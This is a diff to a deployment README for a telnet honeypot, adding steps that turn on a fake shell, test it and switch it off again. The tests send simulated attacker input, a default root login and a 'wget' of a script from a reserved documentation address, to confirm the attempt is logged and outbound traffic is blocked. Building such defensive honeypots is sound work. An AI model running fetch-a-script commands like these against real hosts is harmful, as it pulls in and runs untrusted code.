@@ -23,6 +23,8 @@ point before that and nothing is exposed.
 | `gcp/main.tf`            | The network, firewall rules and server, as Terraform |
 | `host/nftables.conf`     | The firewall on the server itself                    |
 | `host/honeypot.service`  | How systemd runs the program, with its limits        |
+| `host/credentials.txt`   | The logins the fake shell accepts (Stage 7)          |
+| `host/honeypot-shell.conf` | What turns the fake shell on (Stage 7)             |
 
 Commands run on your own computer, unless they're under "On the server".
 
@@ -215,6 +217,79 @@ gcloud logging read "logName=\"projects/$(gcloud config get project)/logs/comput
   --freshness=1d --limit=20
 ```
 
+Once the fake shell from Stage 7 is on, more things mean stop. They're listed in the Stage 7
+checklist in the [main README](../README.md), and `deploy/daily-logs.sh` says which one it found.
+
+## Turning on the fake shell
+
+This is for Stage 7. Only do it once everything under "Before it goes on the server" in the
+[main README](../README.md) is ticked. Until then, the server keeps running the fake login on its
+own, and nothing else changes.
+
+Start with "Updating the server" below, which closes the port and reinstalls the server, so copy
+the logs off first. Build the program the same way as in Stage 6. At step 4, upload two more files:
+
+```sh
+scp target/x86_64-unknown-linux-musl/release/honeypot \
+  deploy/host/honeypot.service deploy/host/nftables.conf \
+  deploy/host/credentials.txt deploy/host/honeypot-shell.conf honeypot:
+```
+
+On the server, run these after the `systemctl daemon-reload` in step 4, and before the reboot:
+
+```sh
+sudo install -m 644 credentials.txt /opt/honeypot/credentials.txt
+sudo install -D -m 644 honeypot-shell.conf /etc/systemd/system/honeypot.service.d/shell.conf
+sudo systemctl daemon-reload
+```
+
+Carry on through steps 5 and 6. Then, on the server, check the shell before anyone can reach it.
+The first command should show `noexec`, which means nothing outside the program's folder can be
+run. The second should start with a few odd characters, which are the telnet opening, and end with
+a fake `wget` failure, and the third should show that command and
+its address. The last should find no entries, because nothing tried to connect out. `203.0.113.1`
+is reserved for documentation, so nobody's there.
+
+```sh
+sudo awk '$5 == "/" { print $6 }' "/proc/$(systemctl show honeypot -p MainPID --value)/mountinfo"
+timeout 5 bash -c 'exec 3<>/dev/tcp/127.0.0.1/2323; printf "root\nroot\nwget http://203.0.113.1/a.sh\nexit\n" >&3; cat <&3'
+sudo sh -c 'tail -n 1 /var/lib/honeypot/logs/visits-*.jsonl'
+sudo journalctl -k --since '5 minutes ago' --grep egress-blocked-honeypot --no-pager
+```
+
+Practise turning the shell off without stopping anything else. That also removes the telnet
+opening, so the server behaves exactly as it did before. The last command should say
+`Login incorrect`, with no odd characters first.
+
+```sh
+sudo rm /etc/systemd/system/honeypot.service.d/shell.conf
+sudo systemctl daemon-reload && sudo systemctl restart honeypot
+timeout 5 bash -c 'exec 3<>/dev/tcp/127.0.0.1/2323; printf "root\nroot\n" >&3; cat <&3'
+```
+
+Turn it on again the same way as before, and restart:
+
+```sh
+sudo install -D -m 644 honeypot-shell.conf /etc/systemd/system/honeypot.service.d/shell.conf
+sudo systemctl daemon-reload && sudo systemctl restart honeypot
+```
+
+Then do step 7 and step 8. After step 8, test it from your own computer. The first command should
+reach the prompt and end with the fake `wget` failure, and the second should say `Login incorrect`.
+The last one tests outbound from the server, and should say `blocked`. Leave `nftables` running for
+this, and don't repeat the `nft flush` from step 5, because the port is open now.
+
+```sh
+IP=$(terraform output -raw public_ip)
+printf 'root\nroot\nuname -m\nwget http://203.0.113.1/a.sh\nexit\n' | nc -w 10 "$IP" 23
+printf 'root\nnot-on-the-list\n' | nc -w 10 "$IP" 23
+nc -z -w 5 "$IP" 22 && echo 'OPEN: STOP' || echo closed
+nc -z -w 5 "$IP" 2323 && echo 'OPEN: STOP' || echo closed
+ssh honeypot "timeout 5 bash -c '</dev/tcp/1.1.1.1/443' && echo 'CONNECTED: STOP' || echo blocked"
+```
+
+The next day, `deploy/daily-logs.sh` should say `Fake shell: on` and `Nothing that needs stopping.`
+
 ## Copying logs off
 
 The server never sends anything out, so you pull the logs from your own computer. Keep this
@@ -227,8 +302,9 @@ ssh honeypot 'sudo tar -C /var/lib/honeypot/logs -cf - .' | tar -C ~/honeypot-lo
 find ~/honeypot-logs -name 'visits-*.jsonl' -mtime +30 -delete
 ```
 
-`deploy/daily-logs.sh` does all of this, then prints a short summary and tells you if anything
-means you should stop the server. It's meant to be run once a day.
+`deploy/daily-logs.sh` does the same, but copies only the logs that have changed, then prints a
+short summary and tells you if anything means you should stop the server. It's meant to be run
+once a day.
 
 ## Updating the server
 
@@ -248,6 +324,7 @@ Then go back to step 4, and carry on through to step 8.
 | ---------------------------------- | ------------------------------------------------------- |
 | Stop now and keep the evidence     | `gcloud compute instances stop honeypot`                |
 | Keep it running but close the port | Set `expose_fake_login = false`, then `terraform apply` |
+| Close the fake shell, keep the login | On the server: `sudo rm /etc/systemd/system/honeypot.service.d/shell.conf`, `sudo systemctl daemon-reload`, then `sudo systemctl restart honeypot` |
 | Remove the server and its logs     | `terraform destroy`                                     |
 | End everything for good            | `gcloud projects delete "$(gcloud config get project)"` |
 
